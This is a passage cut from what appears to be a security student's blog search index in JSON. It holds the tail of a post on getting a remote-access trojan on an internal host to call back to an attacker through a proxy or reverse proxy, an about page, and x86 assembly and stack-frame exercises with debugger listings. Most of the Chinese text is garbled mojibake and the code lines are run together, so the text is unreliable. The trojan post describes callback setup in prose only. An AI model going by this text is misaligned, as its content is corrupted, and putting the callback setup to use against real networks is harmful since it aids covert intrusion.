‡ç«¯ç¨‹åºåœ¨ä¸»æœºAä¸Šè¿è¡Œï¼Œé€šè¿‡åå‘ä»£ç†å‡ºç½‘ï¼Œå®ç°ä¸Šçº¿ã€‚ å°ç»“ æ–¹å¼ ä»£ç†ç©¿é€ åå‘ä»£ç† å‰ç½®æ¡ä»¶ Bé€šè¿‡æŸäº›è½¯ä»¶æ­å»ºæˆä¸ºä»£ç†æœåŠ¡å™¨ï¼ŒAé€šè¿‡è®¾ç½®Bçš„ipå’Œç«¯å£ä½œä¸ºä»£ç†æœåŠ¡å™¨è¿›è¡Œä¸Šç½‘ æ”»å‡»è€…ä¸»æœºCä¸é¶æœºBä¹‹é—´å·²æ„å»ºåå‘ä»£ç†é€šé“ï¼Œæ”»å‡»è€…ä¸»æœºä¸ºclientï¼Œè™šæ‹ŸæœºBä¸ºserver ç›®æ ‡ç«¯ç¨‹åºé…ç½® 1. åå¼¹é©¬åœ°å€é…ç½®ä¸ºï¼š192.168.147.147ï¼ˆæ”»å‡»è€…ä¸»æœºCï¼‰ï¼Œç›‘å¬ç«¯å£66662. ç¨‹åºæ”¾åœ¨å†…ç½‘ä¸»æœºAä¸Šæ‰§è¡Œ 1.åå¼¹é©¬åœ°å€é…ç½®ä¸ºï¼š192.168.242.220ï¼ˆå†…ç½‘ä¸»æœºBï¼‰,ç«¯å£6000ï¼ˆåå‘ä»£ç†è¿œç¨‹è®¿é—®ç«¯å£ï¼‰2. ç¨‹åºæ”¾åœ¨å†…ç½‘ä¸»æœºAä¸Šæ‰§è¡Œ æ‰§è¡Œåå‘ç”Ÿäº†ä»€ä¹ˆ æœ¨é©¬èƒ½å¤Ÿè‡ªåŠ¨è¯»å–ä»£ç†ç±»å‹ï¼Œè®©å†…ç½‘ä¸»æœºAé€šè¿‡ä»£ç†æœåŠ¡å™¨å‡ºç½‘ï¼Œåå¼¹ä¸Šçº¿ å†…ç½‘ä¸»æœºAè¿æ¥å†…ç½‘ä¸»æœºB:6000ï¼Œå› ä¸ºåå‘ä»£ç†ï¼Œè½¬å‘ç»™æ”»å‡»è€…ä¸»æœºCï¼Œå®ç°ä¸Šçº¿ å·®å¼‚ï¼š å·®å¼‚ ä»£ç†ç©¿é€ åå‘ä»£ç† ç›®æ ‡ç«¯ç¨‹åºé…ç½®çš„åå¼¹åœ°å€ æ”»å‡»è€…ä¸»æœº ä»£ç†æœåŠ¡å™¨ ä¸Šçº¿ipåœ°å€ ä»£ç†æœåŠ¡å™¨ é¶æœºæœ¬èº«","tags":["ä»£ç†ç©¿é€","åå‘ä»£ç†"],"categories":["å®‰å…¨æŠ€æœ¯","è¿œæ§æœ¨é©¬"]},{"title":"å…³äº","path":"/about/index.html","content":"About Me 2022å¹´ä¿¡å®‰ä¸“ä¸šæœ¬ç§‘æ¯•ä¸šï¼Œè‡ªå­¦äºŒè¿›åˆ¶æŠ€æœ¯ingï¼Œæ€•ä»€ä¹ˆçœŸç†æ— ç©·ï¼Œè¿›ä¸€å¯¸ä¾¿æœ‰ä¸€å¯¸çš„æ¬¢å–œã€‚ ğŸ’»çƒ­çˆ±è®¡ç®—æœºåº•å±‚æŠ€æœ¯å’Œä¿¡æ¯å®‰å…¨æŠ€æœ¯ ğŸ±â€ğŸäºŒè¿›åˆ¶æŠ€æœ¯çˆ±å¥½è€…ï¼ˆç›®å‰æ˜¯Windowsæ–¹å‘ï¼‰ ğŸ˜æœºçµå¤æ€ª ğŸ˜˜æ°¸è¿œçƒ­çˆ±ï¼Œæ°¸è¿œå¹´è½»ç›¸çŸ¥ ğŸ§å¯¹ä¸€åˆ‡æ–°é²œçš„äº‹ç‰©å……æ»¡å¥½å¥‡ Currently seeking opportunities in the field of binary analysis. Please feel free to contact me by sending an email to 2332521827@qq.com. Thank you! About Blog å­¦ä¹ ç¬”è®°å’Œæ€è€ƒè®°å½•ï¼Œè¿˜æœ‰ä¸€äº›ç”Ÿæ´»ç¢ç‰‡ï¼Œä¸å›å…±å‹‰ã€‚"},{"title":"å°ç»“","path":"/wiki/Assembly_Language/å°ç»“_assembly.html","content":"å› ä¸ºä¹‹å‰çœ‹è¿‡å¹¶åšå®Œäº†è¿™ä¸¤æœ¬ä¹¦ä¸Šçš„ç»ƒä¹ ï¼šã€Šæ±‡ç¼–è¯­è¨€4th-ç‹çˆ½ã€‹-&gt;ã€Šæ±‡ç¼–è¯­è¨€-åŸºäºx86å¤„ç†å™¨-ç¬¬ä¸ƒç‰ˆã€‹ï¼Œæµ·å“¥è§†é¢‘è®²çš„å‡ ä¹å…¨ä¼šï¼Œå¯å‘æ¯”è¾ƒå°‘ã€‚å¦‚æœä½ æœ‰å……è£•çš„æ—¶é—´ï¼Œå¯ä»¥å…ˆçœ‹ã€Šæ±‡ç¼–è¯­è¨€4th-ç‹çˆ½ã€‹ï¼Œå› ä¸º16ä½æ±‡ç¼–æ¯”è¾ƒç®€å•ï¼ŒåŠ ä¹‹ç‹çˆ½è€å¸ˆè¿™æœ¬ä¹¦å†™å¾—å¾ˆå¥½ï¼Œå®¹æ˜“å­¦ä¹ ã€‚å¦‚æœæœ‰ä¸æ‡‚çš„ä¹ é¢˜ï¼Œå¯ä»¥å»å®˜æ–¹è®ºå›çœ‹å‰è¾ˆçš„å¸–å­ï¼Œè™½ç„¶å‘å¸–å›å¸–æ—¶é—´éƒ½æ˜¯é›¶å‡ é›¶å‡ å¹´çš„ï¼Œä½†è¶³ä»¥å­¦ä¹ ï¼Œæˆ‘ä¹‹å‰çœ‹çš„æ—¶å€™å°±ç»å¸¸æ„Ÿæ…¨åå‡ äºŒåå¹´å‰çš„å‰è¾ˆå¯¹äºæ±‡ç¼–ç†è§£ç¨‹åº¦ä¹‹æ·±ã€‚ç„¶åçœ‹é»‘çš®ä¹¦ã€Šæ±‡ç¼–è¯­è¨€-åŸºäºx86å¤„ç†å™¨-ç¬¬ä¸ƒç‰ˆã€‹å¹¶å®Œæˆè¯¾åä¹ é¢˜ï¼Œè¿™æœ¬ä¹¦ä¸»è¦æ˜¯è®²32ä½æ±‡ç¼–ï¼Œé¡ºä¾¿æåŠx64çš„è¯­æ³•ã€‚è¿™æ ·çœ‹å®Œä¸¤æœ¬ä¹¦ï¼Œä½ å¯¹äºæ±‡ç¼–çš„ç†è§£ä¼šå¾ˆæ‰å®ã€‚æµ·å“¥è§†é¢‘çš„æ±‡ç¼–éƒ¨åˆ†æˆ‘æ„Ÿè§‰è¿˜æ˜¯å‹ç¼©äº†å¾ˆå¤šå†…å®¹ï¼Œå¯èƒ½å› ä¸ºæ˜¯ä»é€†å‘è§’åº¦æ¥è®²è§£æ±‡ç¼–ã€‚æ‰€ä»¥è¿™ç¯‡å°ç»“å‡ ä¹æ²¡æƒ³å†™ä»€ä¹ˆå†…å®¹ã€‚ æ±‡ç¼–å¸¸ç”¨æŒ‡ä»¤å°±æ˜¯é‚£äº›ï¼Œè¿™é‡Œä¸ä½œå°ç»“ã€‚æ³¨æ„ä¸€æ¡æŒ‡ä»¤ä¼šå½±å“å“ªäº›æ ‡å¿—ä½ã€‚ï¼ˆé»‘çš®ä¹¦åçš„æŒ‡ä»¤é™„å½•å¯ä»¥å½“å·¥å…·ä¹¦æ¥æŸ¥ï¼‰ æ ‡å¿—å¯„å­˜å™¨å’ŒJCCæŒ‡ä»¤ï¼Œè·³è½¬æƒ…å†µï¼Œç»å¸¸æŸ¥å°±è¡Œï¼Œä¸éœ€è¦è®°å¿†ã€‚ æ‘˜è‡ªç‹çˆ½ã€Šæ±‡ç¼–è¯­è¨€ã€‹çš„è®ºå›ä¸»é¢˜ : : ç”±ç¬¬11ç« æ£€æµ‹é¢˜ã€€ç¬¬3é¢˜å¼•å‡ºçš„æ€è€ƒï¼šæ€ä¹ˆåˆ¤æ–­è®¡ç®—æœºè¿›è¡Œçš„æ˜¯æœ‰ç¬¦å·æ•°è¿ç®—è¿˜æ˜¯æ— ç¬¦å·æ•°è¿ç®—ï¼Ÿ ä¸€ä¸ªæ•°æ˜¯ä¸æ˜¯æœ‰ç¬¦å·æ•°å–å†³äºç¨‹åºå‘˜å¯¹å‚ä¸è¿ç®—çš„æ•°æœ€é«˜ä½çš„ä½¿ç”¨ï¼šè®¤ä¸ºå‚ä¸è¿ç®—çš„æ•°çš„æœ€é«˜ä½æ˜¯ç¬¦å·ä½ï¼Œåˆ™æ˜¯æœ‰ç¬¦å·æ•°ï¼›è®¤ä¸ºå‚ä¸è¿ç®—çš„æ•°æ˜¯æœ€é«˜ä½æ˜¯æœ‰æ•ˆä½ï¼Œåˆ™æ˜¯æ— ç¬¦å·æ•°ã€‚å…¶å®è®¡ç®—æœºåœ¨è¿›è¡ŒåŠ å‡è¿ç®—æ—¶æ˜¯ä¸çŸ¥é“æ‰€å¤„ç†çš„æ•°æ˜¯æœ‰ç¬¦å·æ•°è¿˜æ˜¯æ— ç¬¦å·æ•°ï¼Œè®¡ç®—æœºåœ¨è¿›è¡ŒåŠ å‡è¿ç®—æ—¶ï¼Œæ˜¯å°†è¿ç®—ç»“æœä½œä¸ºæœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°å¯¹ç¬¦å·ä½çš„å½±å“éƒ½é€šè¿‡æ ‡å¿—å¯„å­˜å™¨â€œç½—åˆ—â€å‡ºæ¥ï¼Œä¾›ç¼–ç¨‹è€…ä½¿ç”¨ã€‚ æµ·å“¥çš„è§†é¢‘ï¼Œç»™åˆ°æˆ‘çš„çŸ¥è¯†ç‚¹å’Œå¯å‘å°±æ˜¯ï¼š è¦çŸ¥é“æŒ‡ä»¤èƒŒåå‘ç”Ÿçš„äº‹ï¼Œå¯ç”¨å“ªäº›ç­‰ä»·æŒ‡ä»¤è¿›è¡Œæ›¿æ¢ã€‚ç”¨é€”ï¼šæŒ‡ä»¤çš„å˜å½¢ è¦å¯¹å †æ ˆå˜åŒ–éå¸¸ç†Ÿæ‚‰ å‚è€ƒ é“¾æ¥/ä¹¦ç± å¤‡æ³¨ æ»´æ°´é€†å‘è¯¾ç¨‹ç¬”è®°-ä¸‰æœŸæ±‡ç¼–è¯­è¨€ ç¬”è®°å‚è€ƒ æ»´æ°´é€†å‘3æœŸç¬”è®°ä¸ä½œä¸šâ€”â€”01æ±‡ç¼– ç¬”è®°å‚è€ƒ ã€Šæ±‡ç¼–è¯­è¨€4th-ç‹çˆ½ã€‹ ã€Šæ±‡ç¼–è¯­è¨€-åŸºäºx86å¤„ç†å™¨-ä¸­æ–‡ç¬¬ä¸ƒç‰ˆã€‹ æµ·å“¥ä¸‰æœŸçš„æ±‡ç¼–è§†é¢‘éƒ¨åˆ† æ±‡ç¼–ï¼ˆå…­ï¼‰JCCæŒ‡ä»¤ æ‹·äº†é‚£ä¸ªJCCè¡¨ æ±‡ç¼–JCCæŒ‡ä»¤è¡¨ æ‹·äº†é‚£ä¸ªJCCè¡¨"},{"title":"å †æ ˆå›¾","path":"/wiki/Assembly_Language/å †æ ˆå›¾.html","content":"å‡½æ•° è®¡ç®—æœºçš„å‡½æ•°ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šçš„ä¸€ä¸ªç¨‹åºæ®µï¼Œæˆ–ç§°å…¶ä¸ºä¸€ä¸ªå­ç¨‹åºï¼Œå®ƒåœ¨å¯ä»¥å®ç°å›ºå®šè¿ç®—åŠŸèƒ½çš„åŒæ—¶è¿˜å¸¦æœ‰ä¸€å…¥å£å’Œä¸€ä¸ªå‡ºå£ï¼Œæ‰€è°“çš„å…¥å£ï¼Œå°±æ˜¯å‡½æ•°æ‰€å¸¦çš„å„ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå…¥å£ï¼ŒæŠŠå‡½æ•°çš„å‚æ•°å€¼ä»£å…¥å­ç¨‹åºï¼Œä¾›è®¡ç®—æœºå¤„ç†ï¼Œæ‰€è°“å‡ºå£ï¼Œå°±æ˜¯æŒ‡å‡½æ•°çš„è®¡ç®—ç»“æœ,ä¹Ÿç§°ä¸ºè¿”å›å€¼ï¼Œåœ¨è®¡ç®—æœºæ±‚å¾—ä¹‹åï¼Œç”±å‡ºå£å¸¦å›ç»™è°ƒç”¨å®ƒçš„ç¨‹åºã€‚ æœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£ï¼Œå…¥å£å¯ä»¥å¸¦å‚ï¼Œä¹Ÿå¯ä»¥ä¸å¸¦å‚ï¼›å‡ºå£è¿”å›æ—¶å¯ä»¥å¸¦å‚ï¼Œä¹Ÿå¯ä»¥ä¸å¸¦å‚ã€‚ æ±‡ç¼–ä¸­çš„å‡½æ•° å‡½æ•°çš„ç‰¹å¾å’Œç»“æ„å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425PUSH EBP ;æå‡å †æ ˆï¼Œä¸ºå‡½æ•°æ‰§è¡Œæä¾›ç©ºé—´MOV EBP,ESPSUB ESP,40PUSH EBX ;ä¿ç•™ç°åœºï¼šå‡½æ•°åœ¨æ‰§è¡Œçš„æ—¶å€™ä¼šç”¨åˆ°ä¸€äº›å¯„å­˜å™¨ï¼Œä½†è¿™äº›å¯„å­˜å™¨ä¸­çš„å€¼å¾ˆå¯èƒ½ä¼šè¢«åé¢çš„PUSH ESI ;ç¨‹åºç”¨åˆ°ï¼Œæ‰€ä»¥è¦å…ˆå­˜å‚¨åˆ°å†…å­˜ä¸­PUSH EDILEA EDI,DWORD PTR SS:[EBP-40] ;å‘åˆ†é…çš„ç©ºé—´å¡«å……æ•°æ®MOV ECX,10 ;è¿™é‡Œæ˜¯åˆ«çš„å‡½æ•°ç•™ä¸‹çš„æ•°æ®MOV EAX,CCCCCCCC ;é˜²æ­¢eipè·‘åˆ°è¿™å°†æ•°æ®å½“æˆä»£ç æ‰§è¡Œï¼Œå¡«å……0xCCï¼Œå¯¹åº”Unicodeçƒ«ï¼Œint3ï¼ŒeipæŒ‡å‘è¿™æ‰§è¡Œä¼šåœä¸‹æ¥REP STOS DWORD PTR ES:[EDI]MOV EAX,DWORD PTR SS:[EBP+8] ;è¯¥å‡½æ•°çš„åŠŸèƒ½ADD EAX,DWORD PTR SS:[EBP+C]POP EDI ;æ¢å¤ç°åœºï¼šå°†ä¹‹å‰ä¿ç•™çš„å¯„å­˜å™¨çš„å€¼æ¢å¤POP ESIPOP EBXMOV ESP,EBP ;é™ä½å †æ ˆPOP EBP ;æ¢å¤æ ˆåº•RETN ;å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œè¿”å›åˆ°è°ƒç”¨å¤„ å‡½æ•°çš„å…¥å£ 1234PUSH 2 ;å‡½æ•°çš„å‚æ•°PUSH 1CALL 0040100A ;è°ƒç”¨å‡½æ•° æ€è€ƒï¼šæ­¤å¤„æˆ‘ä»¬æ˜¯é€šè¿‡å¯„å­˜å™¨å°†éœ€è¦çš„æ•°æ®ä¼ é€’ç»™å‡½æ•°çš„ï¼Œè¿˜å¯ä»¥æœ‰å…¶ä»–çš„æ–¹å¼å—ï¼Ÿ å †æ ˆ å‡½æ•°çš„å‡ºå£ 12MOV EAX,DWORD PTR SS:[EBP+8] ;ä¸Šé¢çš„è¿™ä¸ªå‡½æ•°å°†è®¡ç®—ç»“æœå­˜å‚¨åˆ°EAXä¸­ADD EAX,DWORD PTR SS:[EBP+C] ;æˆ‘ä»¬ç§°ä¸ºè¿”å›å€¼ æ€è€ƒï¼šå‡½æ•°çš„è®¡ç®—ç»“æœé™¤äº†æ”¾åœ¨å¯„å­˜å™¨ä¸­ï¼Œè¿˜å¯ä»¥æ”¾åœ¨ä»€ä¹ˆåœ°æ–¹ï¼Ÿ å†…å­˜ã€‚ Windowså †æ ˆçš„ç‰¹ç‚¹ å…ˆè¿›åå‡º å‘ä½åœ°å€æ‰©å±• ç”»å †æ ˆå›¾ç»ƒä¹  å‡½æ•° ç¬¬1é¢˜ï¼š0x401174 è°ƒç”¨å‰å¯„å­˜å™¨æƒ…å†µï¼š EAX 00000003 ECX 00000000 EDX 007713C0 EBX 003AB000 ESP 0019FEE4 EBP 0019FF30 ESI 00401220 EDI 0019FF30 1234500401174 |. 6A 04 PUSH 400401176 |. 6A 03 PUSH 300401178 |. 6A 02 PUSH 20040117A |. E8 9AFEFFFF CALL HelloWor.004010190040117F |. 83C4 0C ADD ESP,0C 100401019 $ /E9 52000000 JMP HelloWor.00401070 1234567891011121314151617181900401070 /&gt; \\55 PUSH EBP00401071 |. 8BEC MOV EBP,ESP00401073 |. 83EC 40 SUB ESP,4000401076 |. 53 PUSH EBX00401077 |. 56 PUSH ESI00401078 |. 57 PUSH EDI00401079 |. 8D7D C0 LEA EDI,DWORD PTR SS:[EBP-40]0040107C |. B9 10000000 MOV ECX,1000401081 |. B8 CCCCCCCC MOV EAX,CCCCCCCC00401086 |. F3:AB REP STOS DWORD PTR ES:[EDI]00401088 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040108B |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]0040108E |. 2B45 10 SUB EAX,DWORD PTR SS:[EBP+10]00401091 |. 5F POP EDI00401092 |. 5E POP ESI00401093 |. 5B POP EBX00401094 |. 8BE5 MOV ESP,EBP00401096 |. 5D POP EBP00401097 \\. C3 RETN ç¬¬2é¢˜ï¼š0x401182 è°ƒç”¨å‰å¯„å­˜å™¨æƒ…å†µï¼š EAX 00000001 ECX 00000000 EDX 007713C0 EBX 003AB000 ESP 0019FEE4 EBP 0019FF30 ESI 00401220 EDI 0019FF30 123400401182 |. 6A 06 PUSH 600401184 |. 6A 05 PUSH 500401186 |. E8 7AFEFFFF CALL HelloWor.004010050040118B |. 83C4 08 ADD ESP,8 100401005 $ /E9 A6000000 JMP HelloWor.004010B0 12345678910111213141516171819202122004010B0 /&gt; \\55 PUSH EBP004010B1 |. 8BEC MOV EBP,ESP004010B3 |. 83EC 48 SUB ESP,48004010B6 |. 53 PUSH EBX004010B7 |. 56 PUSH ESI004010B8 |. 57 PUSH EDI004010B9 |. 8D7D B8 LEA EDI,DWORD PTR SS:[EBP-48]004010BC |. B9 12000000 MOV ECX,12004010C1 |. B8 CCCCCCCC MOV EAX,CCCCCCCC004010C6 |. F3:AB REP STOS DWORD PTR ES:[EDI]004010C8 |. C745 FC 0A000&gt;MOV DWORD PTR SS:[EBP-4],0A004010CF |. C745 F8 05000&gt;MOV DWORD PTR SS:[EBP-8],5004010D6 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]004010D9 |. 0345 0C ADD EAX,DWORD PTR SS:[EBP+C]004010DC |. 2B45 F8 SUB EAX,DWORD PTR SS:[EBP-8]004010DF |. 0345 FC ADD EAX,DWORD PTR SS:[EBP-4]004010E2 |. 5F POP EDI004010E3 |. 5E POP ESI004010E4 |. 5B POP EBX004010E5 |. 8BE5 MOV ESP,EBP004010E7 |. 5D POP EBP004010E8 \\. C3 RETN ç¬¬ä¸‰é¢˜ï¼š0x40118E è°ƒç”¨å‰å¯„å­˜å™¨æƒ…å†µï¼š EAX 00000010 ECX 00000000 EDX 007713C0 EBX 003AB000 ESP 0019FEE4 EBP 0019FF30 ESI 00401220 EDI 0019FF30 123450040118E |. 6A 09 PUSH 900401190 |. 6A 0C PUSH 0C00401192 |. 6A 05 PUSH 500401194 |. E8 85FEFFFF CALL HelloWor.0040101E00401199 |. 83C4 0C ADD ESP,0C 10040101E $ /E9 DD000000 JMP HelloWor.00401100 123456789101112131415161718192021222324252627282930313200401100 /&gt; \\55 PUSH EBP00401101 |. 8BEC MOV EBP,ESP00401103 |. 83EC 40 SUB ESP,4000401106 |. 53 PUSH EBX00401107 |. 56 PUSH ESI00401108 |. 57 PUSH EDI00401109 |. 8D7D C0 LEA EDI,DWORD PTR SS:[EBP-40]0040110C |. B9 10000000 MOV ECX,1000401111 |. B8 CCCCCCCC MOV EAX,CCCCCCCC00401116 |. F3:AB REP STOS DWORD PTR ES:[EDI]00401118 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040111B |. 3B45 0C CMP EAX,DWORD PTR SS:[EBP+C]0040111E |. 7E 12 JLE SHORT HelloWor.0040113200401120 |. 8B4D 08 MOV ECX,DWORD PTR SS:[EBP+8]00401123 |. 3B4D 10 CMP ECX,DWORD PTR SS:[EBP+10]00401126 |. 7E 05 JLE SHORT HelloWor.0040112D00401128 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040112B |. EB 15 JMP SHORT HelloWor.004011420040112D |&gt; 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10]00401130 |. EB 10 JMP SHORT HelloWor.0040114200401132 |&gt; 8B55 0C MOV EDX,DWORD PTR SS:[EBP+C]00401135 |. 3B55 10 CMP EDX,DWORD PTR SS:[EBP+10]00401138 |. 7E 05 JLE SHORT HelloWor.0040113F0040113A |. 8B45 0C MOV EAX,DWORD PTR SS:[EBP+C]0040113D |. EB 03 JMP SHORT HelloWor.004011420040113F |&gt; 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10]00401142 |&gt; 5F POP EDI00401143 |. 5E POP ESI00401144 |. 5B POP EBX00401145 |. 8BE5 MOV ESP,EBP00401147 |. 5D POP EBP00401148 \\. C3 RETN 1234567891011121314151617181920212223242526272829303100401118 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040111B |. 3B45 0C CMP EAX,DWORD PTR SS:[EBP+C]0040111E |. 7E 12 JLE SHORT HelloWor.00401132 ;å‚æ•°1å’Œå‚æ•°2æ¯”å¤§å° ;å‚æ•°1&gt;å‚æ•°2ï¼Œé¡ºåºæ‰§è¡Œç»§ç»­æ¯”è¾ƒ ;å‚æ•°1&lt;=å‚æ•°2ï¼Œè·³00401132ç»§ç»­æ¯”è¾ƒ00401120 |. 8B4D 08 MOV ECX,DWORD PTR SS:[EBP+8]00401123 |. 3B4D 10 CMP ECX,DWORD PTR SS:[EBP+10]00401126 |. 7E 05 JLE SHORT HelloWor.0040112D ;å‚æ•°1å’Œå‚æ•°3æ¯”å¤§å° ;å‚æ•°1&gt;å‚æ•°3ï¼Œé¡ºåºæ‰§è¡Œèµ‹å€¼ç»“æŸè°ƒç”¨ ;å‚æ•°1&lt;=å‚æ•°3ï¼Œè·³0040112Dèµ‹å€¼ç»“æŸè°ƒç”¨00401128 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040112B |. EB 15 JMP SHORT HelloWor.00401142 ;EAX=å‚æ•°1ï¼Œç»“æŸè°ƒç”¨0040112D |&gt; 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10]00401130 |. EB 10 JMP SHORT HelloWor.00401142 ;EAX=å‚æ•°3ï¼Œç»“æŸè°ƒç”¨00401132 |&gt; 8B55 0C MOV EDX,DWORD PTR SS:[EBP+C]00401135 |. 3B55 10 CMP EDX,DWORD PTR SS:[EBP+10]00401138 |. 7E 05 JLE SHORT HelloWor.0040113F ;å‚æ•°2å’Œå‚æ•°3æ¯”å¤§å° ;å‚æ•°2&gt;å‚æ•°3ï¼Œé¡ºåºæ‰§è¡Œèµ‹å€¼ç»“æŸè°ƒç”¨ ;å‚æ•°2&lt;=å‚æ•°3ï¼Œè·³0040113Fèµ‹å€¼ç»“æŸè°ƒç”¨0040113A |. 8B45 0C MOV EAX,DWORD PTR SS:[EBP+C]0040113D |. EB 03 JMP SHORT HelloWor.00401142 ;EAX=å‚æ•°2ï¼Œç»“æŸè°ƒç”¨0040113F |&gt; 8B45 10 MOV EAX,DWORD PTR SS:[EBP+10] ;EAX=å‚æ•°300401142 |&gt; 5F POP EDI å‡½æ•°æ¥æ”¶3ä¸ªå‚æ•°ï¼Œè¿”å›æœ€å¤§å€¼ 123456789101112131415161718192021222324252627int main(int a,int b,int c)&#123; int result; if(a&gt;b) &#123; if(a&gt;c) &#123; result=a; &#125; else &#123; result=c; &#125; &#125; else &#123; if(b&gt;c) &#123; result=b; &#125; else &#123; result=c; &#125; &#125; return result;&#125; å‡½æ•°åµŒå¥— Stack.exeï¼Œä»0040D518å¼€å§‹ç”»ï¼Œç”»åˆ°0040D527 è°ƒç”¨å‰å¯„å­˜å™¨æƒ…å†µï¼š EAX CCCCCCCC ECX 00000000 EDX 00AC13B0 EBX 00388000 ESP 0019FEDC EBP 0019FF30 ESI 004010F0 EDI 0019FF30 æœ€å¤–å±‚ç¬¬ä¸€å±‚å‡½æ•°0040100Fç¬¬äºŒå±‚å‡½æ•°00401019ç¬¬ä¸‰å±‚å‡½æ•°0040101412345670040D518 |. 6A 07 PUSH 70040D51A |. 6A 06 PUSH 60040D51C |. 6A 05 PUSH 50040D51E |. 6A 04 PUSH 40040D520 |. 6A 03 PUSH 30040D522 |. E8 E83AFFFF CALL Stack.0040100F0040D527 |. 83C4 14 ADD ESP,1410040100F $ /E9 8CC40000 JMP Stack.0040D4A0 1234567891011121314151617181920212223242526272829303132333435360040D4A0 /&gt; \\55 PUSH EBP0040D4A1 |. 8BEC MOV EBP,ESP0040D4A3 |. 83EC 4C SUB ESP,4C0040D4A6 |. 53 PUSH EBX0040D4A7 |. 56 PUSH ESI0040D4A8 |. 57 PUSH EDI0040D4A9 |. 8D7D B4 LEA EDI,DWORD PTR SS:[EBP-4C]0040D4AC |. B9 13000000 MOV ECX,130040D4B1 |. B8 CCCCCCCC MOV EAX,CCCCCCCC0040D4B6 |. F3:AB REP STOS DWORD PTR ES:[EDI]0040D4B8 |. C745 FC 02000&gt;MOV DWORD PTR SS:[EBP-4],20040D4BF |. C745 F8 03000&gt;MOV DWORD PTR SS:[EBP-8],30040D4C6 |. 8B45 14 MOV EAX,DWORD PTR SS:[EBP+14]0040D4C9 |. 50 PUSH EAX0040D4CA |. 8B4D 10 MOV ECX,DWORD PTR SS:[EBP+10]0040D4CD |. 51 PUSH ECX0040D4CE |. 8B55 0C MOV EDX,DWORD PTR SS:[EBP+C]0040D4D1 |. 52 PUSH EDX0040D4D2 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]0040D4D5 |. 50 PUSH EAX0040D4D6 |. E8 3E3BFFFF CALL Stack.004010190040D4DB |. 83C4 10 ADD ESP,100040D4DE |. 8945 F4 MOV DWORD PTR SS:[EBP-C],EAX0040D4E1 |. 8B45 FC MOV EAX,DWORD PTR SS:[EBP-4]0040D4E4 |. 0345 F8 ADD EAX,DWORD PTR SS:[EBP-8]0040D4E7 |. 0345 18 ADD EAX,DWORD PTR SS:[EBP+18]0040D4EA |. 0345 F4 ADD EAX,DWORD PTR SS:[EBP-C]0040D4ED |. 5F POP EDI0040D4EE |. 5E POP ESI0040D4EF |. 5B POP EBX0040D4F0 |. 83C4 4C ADD ESP,4C0040D4F3 |. 3BEC CMP EBP,ESP0040D4F5 |. E8 B63BFFFF CALL Stack.004010B00040D4FA |. 8BE5 MOV ESP,EBP0040D4FC |. 5D POP EBP0040D4FD \\. C3 RETN MOV ESP,EBPä¹‹å‰è¿™ä¸‰è¡Œä»£ç æ˜¯ç¼–è¯‘å™¨åŠ çš„ï¼Œç¼–è¯‘å™¨ä¼šåœ¨debugç‰ˆè‡ªåŠ¨åŠ ä¸Šè¿™ä¸‰è¡Œï¼Œç”¨æ¥æ£€éªŒå †æ ˆæ˜¯å¦å¹³è¡¡ã€‚å› ä¸ºå®ƒè§‰å¾—ä½ åœ¨ä¸€ä¸ªcallé‡Œåˆè°ƒç”¨äº†ä¸€ä¸ªcallï¼Œå‡†å¤‡è¿”å›æ—¶å †æ ˆä¼šä¸ä¼šä¸å¹³è¡¡ã€‚ 1230040D4F0 |. 83C4 4C ADD ESP,4C0040D4F3 |. 3BEC CMP EBP,ESP0040D4F5 |. E8 B63BFFFF CALL Stack.004010B0 å› ä¸ºæˆ‘ä»¬æ²¡å¯¹å †æ ˆä½œå…¶ä»–æ“ä½œï¼Œå †æ ˆæ˜¯å¹³è¡¡çš„ï¼ŒESP-4Cåå’ŒEBPç›¸ç­‰ï¼ŒZF=1ã€‚CALL 004010B0åã€‚JNZä¸è·³è½¬ï¼Œèµ°RETNé€€å‡ºï¼›å¦‚æœä¸å¹³è¡¡ï¼Œå³ZF=0ï¼ŒJNZè·³è½¬åˆ°004010B3ï¼Œ004010B3éƒ¨åˆ†æ˜¯å‡ºé”™æç¤ºã€‚ 12345678910111213141516171819202122232425262728004010B0 /$ /75 01 JNZ SHORT Stack.004010B3004010B2 |. |C3 RETN004010B3 |&gt; \\55 PUSH EBP004010B4 |. 8BEC MOV EBP,ESP004010B6 |. 83EC 00 SUB ESP,0004010B9 |. 50 PUSH EAX004010BA |. 52 PUSH EDX004010BB |. 53 PUSH EBX004010BC |. 56 PUSH ESI004010BD |. 57 PUSH EDI004010BE |. 68 30204200 PUSH Stack.00422030 ; /Arg5 = 00422030 ASCII &quot;The value of ESP was not properly saved across a function call. This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention. &quot;004010C3 |. 68 2C204200 PUSH Stack.0042202C ; |Arg4 = 0042202C004010C8 |. 6A 2A PUSH 2A ; |Arg3 = 0000002A004010CA |. 68 1C204200 PUSH Stack.0042201C ; |Arg2 = 0042201C ASCII &quot;i386\\chkesp.c&quot;004010CF |. 6A 01 PUSH 1 ; |Arg1 = 00000001004010D1 |. E8 BA020000 CALL Stack.00401390 ; \\Stack.00401390004010D6 |. 83C4 14 ADD ESP,14004010D9 |. 83F8 01 CMP EAX,1004010DC |. 75 01 JNZ SHORT Stack.004010DF004010DE |. CC INT3004010DF |&gt; 5F POP EDI004010E0 |. 5E POP ESI004010E1 |. 5B POP EBX004010E2 |. 5A POP EDX004010E3 |. 58 POP EAX004010E4 |. 8BE5 MOV ESP,EBP004010E6 |. 5D POP EBP004010E7 \\. C3 RETN 100401019 $ /E9 42000000 JMP Stack.00401060 123456789101112131415161718192021222324252627282930313200401060 /&gt; \\55 PUSH 